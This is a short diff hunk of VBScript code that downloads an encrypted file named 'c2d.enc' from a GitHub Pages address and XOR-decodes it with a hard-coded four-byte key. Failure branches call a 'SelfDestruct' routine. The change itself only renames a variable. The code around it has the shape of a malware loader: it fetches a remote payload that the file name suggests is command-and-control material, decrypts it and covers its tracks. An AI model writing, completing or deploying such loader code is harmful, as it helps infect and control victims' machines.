@@ -11,9 +11,10 @@ If x Is Nothing Then MsgBox "FAIL: No XMLHTTP object": SelfDestruct
 x.Open "GET", "https://kai195102.github.io/d/c2d.enc", False
 x.Send
 If x.Status <> 200 Then MsgBox "FAIL: HTTP " & x.Status: SelfDestruct
-data = x.ResponseBody
-If VarType(data) <> 8209 Then MsgBox "FAIL: VarType=" & VarType(data): SelfDestruct
+raw = x.ResponseBody
+If VarType(raw) <> 8209 Then MsgBox "FAIL: VarType=" & VarType(raw): SelfDestruct
 key = Array(&H3A, &H97, &H79, &HB0)
+data = raw
 For i = 0 To UBound(data)
   data(i) = CByte(data(i) Xor key((i Mod 4)))
 Next
